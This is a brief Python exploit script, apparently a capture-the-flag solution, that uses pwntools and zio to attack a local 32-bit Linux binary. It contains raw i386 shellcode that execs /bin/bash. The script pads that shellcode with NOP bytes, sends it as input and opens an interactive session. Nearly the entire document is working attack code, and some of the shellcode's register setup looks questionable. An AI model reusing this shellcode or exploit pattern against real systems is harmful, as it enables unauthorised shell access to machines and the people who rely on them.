from pwn import *
from zio import *

target = "./main"
context(arch = 'i386', os = 'linux')

def get_io(target):
	ELF("./main")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io

def pwn(io):

	#0x0b jie duan 
	shellcode = "\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"


	payload = shellcode.ljust(80, '\x90')
	io.gdb_hint()
	io.write(payload + "\n")
	io.interact()


io = get_io(target)
pwn(io)